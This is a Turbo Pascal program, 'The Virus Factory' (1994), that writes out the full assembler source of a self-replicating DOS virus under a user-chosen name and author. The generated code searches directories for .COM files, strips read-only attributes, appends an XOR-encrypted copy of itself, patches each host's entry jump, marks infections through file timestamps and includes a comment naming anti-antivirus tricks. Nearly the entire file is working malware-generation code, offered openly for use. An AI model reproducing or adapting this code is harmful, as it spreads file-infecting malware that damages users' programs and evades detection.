program virus_factory;
uses crt;
const   st1 = 'clc';
var     t              : text;
        target_file    : string[12];
        vir_name       : string[40];
        vir_author     : string[40];
        z1,z2          : integer;

procedure Intro;
begin
 writeln; writeln;
 writeln('  бдддддбдддддбдддддбдддддбдддддбдддддбдддддбдддддбдддддбдддддбдддддбдддддб');
 writeln('  аддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбдда');
 writeln('  бддаддбддаддбддадддддадддддадддддадддддадддддадддддадддддаддбддаддбддаддб');
 writeln('  аддбддаддбдда                                               аддбддаддбдда');
 writeln('  бддаддбддаддб  <Ч>  T H E   V I R U S   F A C T O R Y  <Ч>  бддаддбддаддб');
 writeln('  аддбддаддбддаддб                   or                    бддаддбддаддбдда');
 writeln('  бддаддбддаддбддаддб   SELF-REPLICATING-CODE-GENERATOR бддаддбддаддбддаддб');
 writeln('  аддбддаддбддаддбддаддб             by              бддаддбддаддбддаддбдда');
 writeln('  бддаддбддаддбддаддбддаддб  (⌡)1994 Sirius V1.0  бддаддбддаддбддаддбддаддб');
 writeln('  аддбддаддбддаддбддаддбддаддбдддддбдддддбдддддбддаддбддаддбддаддбддаддбдда');
 writeln('  бддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддбддаддб');
 writeln('  адддддадддддадддддадддддадддддадддддадддддадддддадддддадддддадддддаддддда');
 writeln;
end;

procedure EnterName;
begin
 writeln;
 writeln('Please enter name of the TARGET SOURCE-FILE:  ');
 readln(target_file);
 assign(t,target_file);
 rewrite(t);
end;

procedure EnterVirNameAuthor;
begin
 writeln('Please enter YOUR NAME :  ');      readln(vir_author);
 writeln('Please enter the VIRUS NAME :  '); readln(vir_name);
end;


procedure Copyright;
begin
 writeln(t,';здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©');
 writeln(t,';Ё                                                                          Ё');
 write  (t,';Ё  VIRUS NAME.........:  '); write(t,vir_name);
 for z1:=1 to 50-length(vir_name)   do write(t,' '); writeln(t,'Ё');
 write  (t,';Ё  AUTHOR.............:  '); write(t,vir_author);
 for z1:=1 to 50-length(vir_author) do write(t,' '); writeln(t,'Ё');
 writeln(t,';Ё  LANGUAGE...........:  Turbo Assembler 3.1                               Ё');
 writeln(t,';Ё                                                                          Ё');
 writeln(t,';Ё  SOURCE CREATED BY  " THE-VIRUS-FACTORY " - version 1.0                  Ё');
 writeln(t,';юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды');
 writeln(t);
end;

procedure Constants;
begin
 writeln(t,'xx              equ  offset s1');
 writeln(t,'xx              equ   offset s1                      ; relocator');
 writeln(t,'v_len           equ   end_mark - start               ; virus size');
 writeln(t,'f_min_len       equ   5                              ; minimal victim`s length');
 writeln(t,'f_max_len       equ   55000                          ; maximal    -       -');
 writeln(t,'my_DTA          equ   64000');
 writeln(t,'dta_attr        equ   my_dta + 15h');
 writeln(t,'dta_time        equ   my_dta + 16h');
 writeln(t,'dta_date        equ   my_dta + 18h');
 writeln(t,'dta_size        equ   my_dta + 1ah');
 writeln(t,'dta_name        equ   my_dta + 1eh');
 writeln(t,'temp_time       equ   64100');
 writeln(t,'temp_date       equ   64102');
 writeln(t,'temp_DTA_ofs    equ   64104');
 writeln(t,'temp_DTA_seg    equ   64106');
 writeln(t,'temp_old_drive  equ   64108');
 writeln(t,'temp_old_attr   equ   64110');
 writeln(t,'int24_es        equ   64112');
 writeln(t,'int24_bx        equ   64114');
 writeln(t,'addr_jmp_op     equ   64120');
 writeln(t,'temp_path       equ   64130');
 writeln(t,'vir_enc_buf     equ   64300');
end;

procedure Macros;
begin
 writeln(t,';ПППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППП');
 writeln(t,';                            M A C R O S');
 writeln(t,';ПППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППП');
 writeln(t,'');
 writeln(t,'MODIFY_PLACE macro place,op1,op2      ; need coz TASM sucks !');
 writeln(t,'               db 0c7h,46h            ; (creates useless nops)');
 writeln(t,'               db (place - xx)');
 writeln(t,'               db op1,op2             ; == mov word ptr [bp+place-xx],op2op1');
 writeln(t,'             endm');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t);
end;

procedure AsmHeader;
begin
 writeln(t,'VIRUS SEGMENT');
 writeln(t,'      ASSUME  CS:VIRUS, DS:VIRUS, ES:VIRUS, SS:VIRUS');
 writeln(t,'      ORG     100H');
 writeln(t);
end;


procedure Main;
begin
writeln(t,'dummy:  jmp start');
 writeln(t);
 writeln(t,';=============================================================================');
 writeln(t);
 writeln(t,'start:');
 writeln(t,'        db   0ddh,81h,0e8h,00   ; OPCODES:   fld');
 writeln(t,'        db   00                 ;            add');
 writeln(t,'s1:     db   5dh,05             ;             -         pop bp');
 writeln(t,'        db   0ebh,0f9h          ;            jmp $-5');
 writeln(t,'');
 writeln(t,'        lea si,[bp+virus_body-xx]');
 writeln(t,'        call crypt');
 writeln(t,'        jmp short virus_body');
 writeln(t,'');
 writeln(t,';-------------------------decryption routine----------------------------------');
 writeln(t,'');
 writeln(t,'CRYPT:  MODIFY_PLACE n_loop, 31h, 14h                   ; OPCOD:  xor [si],dx');
 writeln(t,'        MOV          dx, [bp+offset en_val-xx]');
 writeln(t,'        MOV          cx, (end_enc-virus_body)/2');
 writeln(t,'n_loop: NOP          ; \');
 writeln(t,'        NOP          ; /');
 writeln(t,'        INC          si');
 writeln(t,'        INC          si');
 writeln(t,'        LOOP         n_loop');
 writeln(t,'        RET');
 writeln(t,'');
 writeln(t,';----------------------here begins encrypted code...--------------------------');
 writeln(t,'');
 writeln(t,'virus_body:');
 writeln(t,'        call restore_selfmod');
 writeln(t,'       ');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'        lea si,[bp+orig_bytes-xx]             ;restore first 3bytes of prog');
 writeln(t,'        mov di,100h');
 writeln(t,'        cld');
 writeln(t,'        movsb');
 writeln(t,'        movsw');
 writeln(t,'');
 writeln(t,';----------get old int24 vector--------------------------');
 writeln(t,'        push es');
 writeln(t,'        mov ax,3524h');
 writeln(t,'        int 21h');
 writeln(t,'        mov cs:[int24_es],es');
 writeln(t,'        mov cs:[int24_bx],bx');
 writeln(t,'        pop es');
 writeln(t,'');
 writeln(t,';----------set our new int24------------------------------------');
 writeln(t,'        mov ax,2524h');
 writeln(t,'        lea dx,[bp+new_int24-xx]');
 writeln(t,'        int 21h');
 writeln(t,'');
 writeln(t,';---------get old and set our new Disk Transfer Area-------------');
 writeln(t,'       push es');
 writeln(t,'       mov ah,2fh');
 writeln(t,'       int 21h');
 writeln(t,'       mov cs:[temp_dta_ofs],bx');
 writeln(t,'       mov cs:[temp_dta_seg],es');
 writeln(t,'       pop es');
 writeln(t,'       mov dx,my_dta');
 writeln(t,'       mov ah,1ah');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,';---------------save original drive------------------------------------');
 writeln(t,'');
 writeln(t,'       mov ah,19h');
 writeln(t,'       int 21h');
 writeln(t,'       mov cs:[temp_old_drive],al');
 writeln(t,';------------------------------------------------------------------------------');
 writeln(t,'');
 writeln(t,'save_orig_path:');
 writeln(t,'        mov ah,47h');
 writeln(t,'        xor dl,dl');
 writeln(t,'        mov si,temp_path');
 writeln(t,'        int 21h');
 writeln(t,'');
 writeln(t,';---------------here begins the search for a directory-------------------------');
 writeln(t,'');
 writeln(t,'how_many_drives_to_check  equ  1');
 writeln(t,'');
 writeln(t,'change_drive:');
 writeln(t,'');
 writeln(t,'       mov si,[bp+drv_ptr-xx]');
 writeln(t,'       inc si');
 writeln(t,'       mov [bp+drv_ptr-xx],si');
 writeln(t,'       cmp si,how_many_drives_to_check+1');
 writeln(t,'       jz  @exit1                            ; = exit');
 writeln(t,';--------------------change drive---------------------------------------------');
 writeln(t,'       mov      byte ptr dl,[bp+drive_tab-xx+si]');
 writeln(t,'       mov      ah,0eh');
 writeln(t,'       int      21h');
 writeln(t,'       ;jc       change_drive                     ; when no such drive present');
 writeln(t,'       call     goto_root');
 writeln(t,'');
 writeln(t,';-------------we create the first char of dir mask, dependent of time--------');
 writeln(t,'random_directory:');
 writeln(t,'        mov ah,2ch                      ; get time, dl=sec/100');
 writeln(t,'        int 21h                         ; -->  0<=dl<=99');
 writeln(t,'        shr dl,1');
 writeln(t,'        shr dl,1                        ;--> dl := 1<=dl<=24  ( `A`-`X` )');
 writeln(t,'        add dl,64                       ; += `A`-1');
 writeln(t,'        mov [bp+mask_dir-xx],dl');
 writeln(t,'');
 writeln(t,'        xor bx,bx                       ; zero counter of dir-searches');
 writeln(t,'');
 writeln(t,'find_first_subdir:');
 writeln(t,'        mov ah,4eh');
 writeln(t,'        lea dx,[bp+mask_dir-xx]');
 writeln(t,'        mov cx,00010001b                ; subdir-attributes (11h)');
 writeln(t,'        int 21h');
 writeln(t,'        jnc change_dir');
 writeln(t,'                                        ; not found -->increment dir mask');
 writeln(t,'        mov al,[bp+mask_dir-xx]         ;              letter');
 writeln(t,'        inc al');
 writeln(t,'        cmp al,90                       ;=`Z`');
 writeln(t,'        jbe ffs_1                       ;ok -->jmp');
 writeln(t,'        sub al,26                       ; `Z` --> `A`');
 writeln(t,'ffs_1:  mov [bp+mask_dir-xx],al');
 writeln(t,'');
 writeln(t,'        inc bh                          ; BH helds the number, how many times');
 writeln(t,'        cmp bh,27                       ; we should loop in the alphabete');
 writeln(t,'        jz change_drive');
 writeln(t,'        jmp find_first_subdir');
 writeln(t,'');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'@exit1: jmp @exit2');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'');
 writeln(t,'change_dir:');
 writeln(t,'        mov ah,3bh');
 writeln(t,'        mov dx,dta_name');
 writeln(t,'        int 21h');
 writeln(t,'');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'');
 writeln(t,'find_first_file:');
 writeln(t,'       mov ah,04eh');
 writeln(t,'       mov cx,1                              ;accept RO-protected too !!!!');
 writeln(t,'       lea dx,[bp+mask_com-xx]');
 writeln(t,'f_ff1: int 21h');
 writeln(t,'       jnc check_if_ill');
 writeln(t,'');
 writeln(t,'        mov ah,4eh                      ;');
 writeln(t,'        lea dx,[bp+mask_dir_all-xx]');
 writeln(t,'        mov cx,00010001b                           ;=17');
 writeln(t,'        int 21h');
 writeln(t,'        mov ah,4fh');
 writeln(t,'        int 21h');
 writeln(t,'        mov ah,4fh');
 writeln(t,'        int 21h                         ;now get the third sub-dir');
 writeln(t,'                                        ; not "." nor ".."');
 writeln(t,'        jnc change_dir');
 writeln(t,'');
 writeln(t,'        call    rest_orig_drive');
 writeln(t,'        call    goto_root');
 writeln(t,'        call    rest_orig_path');
 writeln(t,'        cmp     same_path,0');
 writeln(t,'        mov     same_path,1');
 writeln(t,'        jz      find_first_subdir');
 writeln(t,'');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'@exit2: jmp exit                              ; exit');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'');
 writeln(t,'check_if_ill:');
 writeln(t,'       mov      ax,cs:[dta_size]');
 writeln(t,'       cmp      ax,f_max_len');
 writeln(t,'       ja       find_next_file');
 writeln(t,'       cmp      ax,f_min_len');
 writeln(t,'       jb       find_next_file');
 writeln(t,'       mov      ax,cs:[dta_time]');
 writeln(t,'       and      al,00011111b');
 writeln(t,'       cmp      al,00000011b               ;compare secs=6 (=3) (means valid)');
 writeln(t,'       jne      infect');
 writeln(t,'');
 writeln(t,'find_next_file:');
 writeln(t,'       mov      ah,3eh                                ;close file');
 writeln(t,'       int      21h');
 writeln(t,'       mov      ah,4fh                                ;find next');
 writeln(t,'       jmp      short f_ff1');
 writeln(t,'infect:');
 writeln(t,'       mov      one_infected,1');
 writeln(t,'       mov      ax,4300h');
 writeln(t,'       mov      dx,dta_name');
 writeln(t,'       int      21h');
 writeln(t,'       mov      cs:[temp_old_attr],cx');
 writeln(t,'       mov      ax,4301h');
 writeln(t,'       and      cx,1111111111111110b             ;only clear RO-Attribute !');
 writeln(t,'       int      21h');
 writeln(t,'       mov      ax,3d02h                         ;open file');
 writeln(t,'       mov      dx,dta_name');
 writeln(t,'       int      21h');
 writeln(t,'       xchg     ax,bx');
 writeln(t,'');
 writeln(t,'       mov      ax,5700h');
 writeln(t,'       int      21h');
 writeln(t,'       mov      cs:[temp_time],cx');
 writeln(t,'       mov      cs:[temp_date],dx');
 writeln(t,'');
 writeln(t,';----------increment generating number---------------------------');
 writeln(t,'');
 writeln(t,'       inc word ptr cs:[bp+offset generation-xx]');
 writeln(t,'');
 writeln(t,';------------get a random encryption key from timer-----------------');
 writeln(t,'get_val:');
 writeln(t,'       mov ah,2ch                                 ;get clock time');
 writeln(t,'       int 21h');
 writeln(t,'       or dx,dx                                   ; = 0 ?');
 writeln(t,'       je get_val');
 writeln(t,'       mov [bp+offset en_val-xx],dx');
 writeln(t,';-----------------------------------------------------------');
 writeln(t,'       mov ah,3fh                            ;save 3 bytes of victim file');
 writeln(t,'       lea dx,[bp+orig_bytes-xx]');
 writeln(t,'       mov cx,3');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'       mov ax,4202h                               ;pointer to EOF');
 writeln(t,'       xor cx,cx');
 writeln(t,'       cwd                                        ; = zero dx');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'       sub ax,3');
 writeln(t,'       mov word ptr cs:[addr_jmp_op+1],ax       ;jmp - argument');
 writeln(t,'       mov byte ptr cs:[addr_jmp_op],0E9h       ;jmp - operator');
 writeln(t,'');
 writeln(t,'       nop');
 writeln(t,'       nop');
 writeln(t,'       nop');
 writeln(t,'');
 writeln(t,'       lea si,[bp+start-xx]');
 writeln(t,'       mov di,vir_enc_buf                    ;copy virus to buffer in memory');
 writeln(t,'       mov cx,v_len');
 writeln(t,'       cld ');
 writeln(t,'       rep movsb');
 writeln(t,'');
 writeln(t,'       mov si,vir_enc_buf+offset virus_body-offset start    ; encrypt it !!');
 writeln(t,'       call crypt                                           ; (in the buffer)');
 writeln(t,'');
 writeln(t,';-----------------------------------------------------------------------------');
 writeln(t,'       mov ah,40h                                ;copy whole encrypted virus');
 writeln(t,'       mov dx,vir_enc_buf                        ;from buffer to victim');
 writeln(t,'       mov cx,v_len');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'       mov ax,4200h');
 writeln(t,'       xor cx,cx');
 writeln(t,'       cwd');
 writeln(t,'       int 21h');
 writeln(t,'       mov ah,40h                                       ;write new 3 bytes');
 writeln(t,'       mov cx,3');
 writeln(t,'       mov dx,addr_jmp_op');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'       mov ax,5701h');
 writeln(t,'       mov dx,cs:[temp_date]');
 writeln(t,'       mov cx,cs:[temp_time]');
 writeln(t,'       and cl,11100000b');
 writeln(t,'       or  cl,00000011b                                 ;set 6 sec.!!!!!!!!');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'       mov ah,3eh                                       ;close file');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'       mov ax,4301h');
 writeln(t,'       mov dx,dta_name');
 writeln(t,'       mov cx,cs:[temp_old_attr]');
 writeln(t,'       int 21h');
 writeln(t,'');
 writeln(t,'exit:');
 writeln(t,'        call rest_orig_drive');
 writeln(t,'        call goto_root');
 writeln(t,'        call rest_orig_path');
 writeln(t,'');
 writeln(t,';--------------------------restore int24--------------------------------------');
 writeln(t,'       push ds');
 writeln(t,'       mov ax,2524h');
 writeln(t,'       mov ds,cs:[int24_es]');
 writeln(t,'       mov dx,cs:[int24_bx]');
 writeln(t,'       int 21h');
 writeln(t,'       pop ds');
 writeln(t,'');
 writeln(t,';-------------------------restore old DTA------------------------------------');
 writeln(t,'       push ds');
 writeln(t,'       mov ah,1ah');
 writeln(t,'       mov dx,cs:[temp_dta_ofs]');
 writeln(t,'       mov ds,cs:[temp_dta_seg]');
 writeln(t,'       int 21h');
 writeln(t,'       pop ds');
 writeln(t,'');
 writeln(t,';----------------------jump to host prog-------------------------------------');
 writeln(t,'       mov ax,0100h');
 writeln(t,'       push ax');
 writeln(t,'       xor ax,ax                   ; needed coz DOS`s diskcopy sucks');
 writeln(t,'       ret');
 writeln(t,'');
 writeln(t,';ПППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППП');
 writeln(t,';                       P R O C E D U R E S');
 writeln(t,';ПППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППППП');
 writeln(t,'');
 writeln(t,'');
 writeln(t,';-----------------------------our write error int24 handler-------------------');
 writeln(t,'new_int24:');
 writeln(t,'       mov al,3                         ;choose "(F)ail"');
 writeln(t,'       IRET');
 writeln(t,'');
 writeln(t,';----------------------------cd \ --------------------------------------------');
 writeln(t,'goto_root:');
 writeln(t,'        mov     ah,3bh');
 writeln(t,'        lea     dx,[bp+backslash-xx]');
 writeln(t,'        int     21h');
 writeln(t,'        RET');
 writeln(t,'');
 writeln(t,';--------------------------restore original drive-----------------------------');
 writeln(t,'rest_orig_drive proc near');
 writeln(t,'       mov      ah,0eh');
 writeln(t,'       mov      dl,cs:[temp_old_drive]');
 writeln(t,'       int      21h');
 writeln(t,'       RET');
 writeln(t,'rest_orig_drive endp');
 writeln(t,'');
 writeln(t,';-------------------------restore original path-------------------------------');
 writeln(t,'rest_orig_path:');
 writeln(t,'        mov     ah,3bh');
 writeln(t,'        mov     dx,temp_path');
 writeln(t,'        int     21h');
 writeln(t,'        RET');
 writeln(t,';-----------------restore anti-THUNDERBYTE hiding places----------------------');
 writeln(t,'restore_selfmod:');
 writeln(t,'        modify_place n_loop , 90h , 90h');
 writeln(t,'        RET');
 writeln(t);
 writeln(t,';---------------------------here is our data----------------------------------');
 writeln(t);
 writeln(t,'orig_bytes    db   90h,0CDh,20h');
 writeln(t,'mask_com      db   "*.CoM" ,0');
 writeln(t,'mask_dir      db   "?*"    ,0');
 writeln(t,'mask_dir_all  db   "*"     ,0');
 writeln(t,'backslash     db   "\"     ,0          ;for root dir needed');
 writeln(t);
 writeln(t,'same_path     db   0');
 writeln(t,'one_infected  db   0');
 writeln(t,'drive_tab     db   2 , 2            ;0=A, 1=B, ,2=C ...');
 writeln(t,'drv_ptr       dw   -1');
 writeln(t);
 writeln(t,'signature     db   "<>[EBBELWOI]v34 by(C)SiRiUS 1/94 D-47885"');
 writeln(t);
 writeln(t,'end_enc equ   $ ;-----------------encrypted code ends-------------------------');
 writeln(t);
 writeln(t,'en_val        dw   0                          ;XOR-encryption value');
 writeln(t,'generation    dw   0                          ; generation number, not');
 writeln(t,'                                              ; needed - Just for Fun  !!');
 writeln(t,'              db   "VFAC"');
 writeln(t,'end_mark equ  $');
 writeln(t);
end;

procedure AsmTail;
begin
 writeln(t,'VIRUS ENDS');
 writeln(t,'      END     DUMMY');
end;


function Check_OK : boolean;
type      vir = record
            nom             : string[15];
            res,exe,ste,boo : char;
          end;
var       vlist             : array[1..13] of vir;
          oks               : array[1..2] of boolean;
          que ,que_num, ask : byte;
          ans               : char;
begin
 with vlist[1]  do begin nom:='Vienna';       res:='n'; exe:='n'; ste:='n'; boo:='n'  end;
 with vlist[2]  do begin nom:='Whale';        res:='y'; exe:='y'; ste:='y'; boo:='n'  end;
 with vlist[3]  do begin nom:='Dark Avanger'; res:='y'; exe:='n'; ste:='n'; boo:='n'  end;
 with vlist[4]  do begin nom:='Tiny-163';     res:='y'; exe:='n'; ste:='n'; boo:='n'  end;
 with vlist[5]  do begin nom:='Leech';        res:='y'; exe:='n'; ste:='y'; boo:='n'  end;
 with vlist[6]  do begin nom:='Alameda';      res:='y'; exe:='n'; ste:='n'; boo:='y'  end;
 with vlist[7]  do begin nom:='Den Zuk';      res:='y'; exe:='n'; ste:='n'; boo:='y'  end;
 with vlist[8]  do begin nom:='Jerusalem';    res:='y'; exe:='y'; ste:='n'; boo:='n'  end;
 with vlist[9]  do begin nom:='Michelangelo'; res:='y'; exe:='n'; ste:='n'; boo:='y'  end;
 with vlist[10] do begin nom:='Stoned';       res:='y'; exe:='n'; ste:='n'; boo:='y'  end;
 with vlist[11] do begin nom:='SVC';          res:='y'; exe:='y'; ste:='y'; boo:='n'  end;
 with vlist[12] do begin nom:='Yankee Doodle';res:='y'; exe:='y'; ste:='n'; boo:='n'  end;
 with vlist[13] do begin nom:='Violator';     res:='n'; exe:='y'; ste:='n'; boo:='n'  end;

 writeln;
 writeln('====================== ACCES CHECK =======================');
 writeln('Please answer the following questions with an "y" or "n" !');
 writeln;

 oks[1]:=false; oks[2]:=false;
 for que_num:=1 to 2 do
 begin
 ask:=1+random(4);
 que:=1+random(13);
 case ask of
 1: begin
     writeln('Does the virus ',vlist[que].nom,' go resident ?');
     repeat
     ans:=readkey
     until ans in ['y','n'];
     if ans=vlist[que].res then oks[que_num]:=true;
    end;
 2: begin
     writeln('Does the virus ',vlist[que].nom,' infect EXE files ?');
     repeat
     ans:=readkey
     until ans in ['y','n'];
     if ans=vlist[que].exe then oks[que_num]:=true;
    end;
 3: begin
     writeln('Does the virus ',vlist[que].nom,' use any stealth-techniques ?');
     repeat
     ans:=readkey
     until ans in ['y','n'];
    if ans=vlist[que].exe then oks[que_num]:=true;
    end;
 4: begin
     writeln('Does the virus ',vlist[que].nom,' infect boot-blocks ?');
     repeat
     ans:=readkey
     until ans in ['y','n'];
     if ans=vlist[que].boo then oks[que_num]:=true;
    end
 end
 end;
 writeln;
 if (oks[1]=true) and (oks[2]=true)
 then
  begin
  writeln('CHECK SUCCES. - You may proceed.');
  Check_OK:=true
  end
 else
 begin
 writeln('CHECK FAILED. - You have not enough knowledge to use this program.');
 Check_OK:=false
 end
end;


BEGIN
 randomize;
 Intro;
{ if not Check_OK then exit else }

 EnterName;
 EnterVirNameAuthor;

 Copyright;

 Constants;
 Macros;
 AsmHeader;
 Main;
 AsmTail;

 Close(t);
end.
